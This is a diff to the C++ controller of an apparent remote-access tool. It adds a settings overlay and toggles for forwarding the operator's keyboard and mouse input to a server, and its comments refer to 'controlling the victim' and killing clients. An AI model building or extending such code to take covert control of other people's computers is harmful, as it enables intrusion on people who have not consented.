@@ -2,6 +2,7 @@
 
 Controller::Controller()
 {
+    font.loadFromFile("./font.ttf");
     //if needed create the file
     std::ofstream createFile("./ccontext.txt", std::ios::app);
     createFile.close();
@@ -47,11 +48,9 @@ void Controller::controlWindow()
         if (!w.isOpen()) {
             //open window if needed
             if (isRunning && isConnected && isPaired && isControlling) {
-                w.create(sf::VideoMode(), "Controller", sf::Style::Fullscreen);
+                w.create(sf::VideoMode::getFullscreenModes()[0], "Controller", sf::Style::Fullscreen);
+                w.setView(sf::View(sf::Vector2f(960, 540), sf::Vector2f(1920, 1080)));
                 w.setFramerateLimit(20);
-                sf::Packet p;
-                p << sf::Uint8('a');
-                server.send(p);
             }
             //reconnect with server if needed
             else if (isRunning && !isConnected) {
@@ -68,12 +67,21 @@ void Controller::controlWindow()
                 continue;
             }
         }
-        //close window and release keys
+        //close window if not controlling
         else if (!isControlling || !isPaired) {
             w.close();
-            sf::Packet p;
-            p << sf::Uint8('a');
-            server.send(p);
+            //stop controlling keyboard
+            if (sendKeys) {
+                sf::Packet p;
+                p << sf::Uint8('z');
+                server.send(p);
+            }
+            //stop controlling mouse
+            if (sendMouse) {
+                sf::Packet p;
+                p << sf::Uint8('x');
+                server.send(p);
+            }
         }
 
         //catch windows events
@@ -82,11 +90,20 @@ void Controller::controlWindow()
             if (e.type == sf::Event::Closed) {
                 w.close();
                 isControlling = false;
-                sf::Packet p;
-                p << sf::Uint8('a');
-                server.send(p);
+                //stop controlling keyboard
+                if (sendKeys) {
+                    sf::Packet p;
+                    p << sf::Uint8('z');
+                    server.send(p);
+                }
+                //stop controlling mouse
+                if (sendMouse) {
+                    sf::Packet p;
+                    p << sf::Uint8('x');
+                    server.send(p);
+                }
             }
-            else if (e.type == sf::Event::MouseWheelScrolled)
+            else if (e.type == sf::Event::MouseWheelScrolled && sendMouse && !areSettingsOpen)
             {
                 sf::Packet p;
                 p << sf::Uint8('k') << sf::Int8(e.mouseWheelScroll.delta);
@@ -94,9 +111,29 @@ void Controller::controlWindow()
             }   
         }
 
+        //open/close settings
+        bool insState = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(0x2D));
+        if (insState && !keys[0x2D]) {
+            areSettingsOpen = true;
+            if (sendKeys) {
+                sf::Packet p;
+                p << sf::Uint8('z');
+                server.send(p);
+            }
+        }
+        else if (!insState && keys[0x2D]) {
+            areSettingsOpen = false;
+            if (sendKeys) {
+                sf::Packet p;
+                p << sf::Uint8('a');
+                server.send(p);
+            }
+        }
+        keys[0x2D] = insState;
+
         //send mouse position if needed
         auto mousePos = Mlib::Mouse::getPos();
-        if (mousePos != lastMousePos) {
+        if (mousePos != lastMousePos && sendMouse) {
             float x = mousePos.x / float(screenSize.x), y = mousePos.y / float(screenSize.y);
             sf::Packet p;
             p << sf::Uint8('l') << sf::Uint16(x * 256 * 256) << sf::Uint16(y * 256 * 256);
@@ -104,23 +141,65 @@ void Controller::controlWindow()
         }
         lastMousePos = mousePos;
 
-        //send key pressed-released events if needed
+        //send keys and buttons pressed-released events if needed
         for (int i = 0; i < 256; i++) {
+            //skip and ins key
+            if (i == 0x2D)
+                continue;
+
             bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
-            if (!state && keys[i]) {
-                sf::Packet p;
-                p << sf::Uint8('m') << sf::Uint8(i);
-                server.send(p);
+            bool isMouseButton = (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06);
+            bool releaseEvent = Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i));
+            if ((!areSettingsOpen && !isMouseButton && sendKeys) || (isMouseButton && sendMouse)) {
+                if (!state && keys[i]) {
+                    sf::Packet p;
+                    p << sf::Uint8('m') << sf::Uint8(i);
+                    server.send(p);
+                }
+                else if (releaseEvent) {
+                    sf::Packet p;
+                    p << sf::Uint8('n') << sf::Uint8(i);
+                    server.send(p);
+                }
             }
-            else if (Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i))) {
-                sf::Packet p;
-                p << sf::Uint8('n') << sf::Uint8(i);
-                server.send(p);
+            if (areSettingsOpen && i >= 0x30 && i <= 0x39 && state && !keys[i]) {
+                if (i == 0x30) {
+                    isControlling = false;
+                }
+                else if (i == 0x31) {
+                    sendMouse = !sendMouse;
+                    if (sendMouse) {
+                        sf::Packet p;
+                        p << sf::Uint8('s');
+                        server.send(p);
+                    }
+                    else {
+                        sf::Packet p;
+                        p << sf::Uint8('x');
+                        server.send(p);
+                    }
+                }
+                else if (i == 0x32) {
+                    sendKeys = !sendKeys;
+                }
             }
+
             keys[i] = state;
         }
 
-        w.clear(sf::Color(30, 30, 30));
+        w.clear(sf::Color(60, 60, 60));
+        std::string str("SETTINGS [ins] = ");
+        str += ((areSettingsOpen) ? "OPEN\n" : "CLOSED\n");
+        str += "MOUSE [1] = ";
+        str += ((sendMouse) ? "ACTIVE\n" : "INACTIVE\n");
+        str += "KEYBOARD [2] = ";
+        str += ((sendKeys) ? "ACTIVE" : "INACTIVE");
+
+        sf::Text txt(str, font, 20);
+        txt.setPosition(8, 6);
+        txt.setLineSpacing(1.4);
+        w.draw(txt);
+
         w.display();
     }
 }
@@ -236,7 +315,7 @@ void Controller::takeCmdInput()
         //start controlling the victim
         else if (cmd.substr(0, 7) == "control" && isPaired) {
             Mlib::sleep(500);
-            isControlling = true;
+            isControlling = true, sendKeys = false, sendMouse = false, areSettingsOpen = false;
         }
         //kill a given client
         else if (cmd.substr(0, 4) == "kill") {
